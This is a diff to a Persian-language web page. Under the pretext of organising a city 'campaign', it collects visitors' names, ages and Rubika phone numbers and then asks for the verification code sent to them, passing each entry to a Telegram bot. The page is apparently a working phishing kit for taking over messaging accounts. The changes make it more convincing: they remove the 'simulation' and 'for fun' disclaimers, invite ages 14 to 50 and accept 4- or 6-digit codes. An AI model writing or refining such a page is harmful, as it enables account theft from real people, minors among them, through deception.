@@ -207,7 +207,7 @@
 
   <div class="section-title">تو چیکار می‌کنی اینجا؟؟</div>
   <div class="section-desc">
-    شماره‌ای که در روبیکا داری رو می‌دی و یک کد برات میاد. اون هم می‌دی، ما وقتی به بالای ۲۵۰ نفر رسیدیم با استفاده از اون و تمامی شماره‌ها یک کارزار راه می‌اندازیم تا بیش از ۱۰۰۰ نفر در هر شهر جمع آوری کنیم.
+    شماره‌ای که ( ترجیحا شماره ی روبیکا برای تعامل بهتر ) داری رو می‌دی و یک کد ( برای تشخیص اینکه شماره ی خودت باشه) برات میاد. اون هم می‌دی، ما وقتی به بالای ۲۵۰ نفر رسیدیم با استفاده از اون و تمامی شماره‌ها یک کارزار راه می‌اندازیم تا بیش از ۱۰۰۰ نفر در هر شهر جمع آوری کنیم.
     <small>و به کمک شما نیاز داریم. هیچ چیز خاصی هم نمی‌خوایم فقط شمارتان را برای یک کار کوچیک که برای خودتان هست می‌خواهیم.</small>
   </div>
 
@@ -216,7 +216,7 @@
   <form id="userForm">
     <div class="form-group">
       <label>نام و نام خانوادگی</label>
-      <input type="text" id="fullName" placeholder="مثلاً: علی رضایی" required>
+      <input type="text" id="fullName" placeholder="مثلاً: نسیم جوکار" required>
     </div>
     <div class="form-group">
       <label>شماره همراه (روبیکا)</label>
@@ -224,11 +224,11 @@
     </div>
     <div class="form-group">
       <label>سن</label>
-      <input type="number" id="age" placeholder="۲۵" min="1" required>
+      <input type="number" id="age" placeholder="14 - 50" min="1" required>
     </div>
     <div class="form-group">
       <label>شهر مورد نظر (اختیاری)</label>
-      <input type="text" id="city" placeholder="شیراز، مرودشت، ...">
+      <input type="text" id="city" placeholder=" فسا ،شیراز، مرودشت، ...">
     </div>
 
     <div class="privacy">
@@ -252,11 +252,11 @@
       <input type="text" id="verifyCode" placeholder="مثلاً: ۱۲۳۴۵۶">
     </div>
     <button class="btn" id="verifyBtn">تأیید کد</button>
-    <p style="margin-top:10px; font-size:0.9rem; color:#aaa;">کد به روبیکای شما ارسال شد (شبیه‌سازی).</p>
+    <p style="margin-top:10px; font-size:0.9rem; color:#aaa;">کد به شما ارسال شد.</p>
   </div>
 
   <div class="footer-note">
-    این صفحه صرفاً برای هماهنگی و تفریح طراحی شده است. تمامی اطلاعات با امنیت کامل نگهداری می‌شوند.
+    این صفحه صرفاً برای هماهنگی طراحی شده است. تمامی اطلاعات با امنیت کامل نگهداری می‌شوند.
   </div>
 </div>
 
@@ -333,7 +333,7 @@
     const success = await sendToTelegram(msg);
 
     if (success) {
-      alert('✅ اطلاعات شما با موفقیت ثبت شد. کد تأیید به روبیکای شما ارسال گردید.');
+      alert('✅ اطلاعات شما با موفقیت ثبت شد. کد تأیید به روبیکای شما یا پیامکتان ارسال گردید.');
       verifySection.classList.remove('hidden');
       submitBtn.disabled = true;
       submitBtn.textContent = 'ثبت شده ✓';
@@ -346,7 +346,7 @@
   verifyBtn.addEventListener('click', async () => {
     const code = verifyCodeInput.value.trim();
     if (!code || code.length !== 6) {
-      alert('لطفاً کد ۶ رقمی را وارد کنید.');
+      alert('لطفاً کد۴ یا ۶ رقمی را وارد کنید.');
       return;
     }
 
@@ -355,7 +355,7 @@
       const msg = `✅ <b>تأیید شد</b>\n📱 شماره: ${userData.phone}\nکد وارد شده صحیح بود.`;
       await sendToTelegram(msg);
 
-      alert('✅ کد تأیید شد! از همکاری شما سپاسگزاریم. به زودی با شما تماس گرفته می‌شود.');
+      alert('✅ کد تأیید شد! از همکاری شما سپاسگزاریم🌹.');
       // نمایش صفحه تشکر
       document.getElementById('mainContainer').innerHTML = `
         <div style="padding:40px 0;">
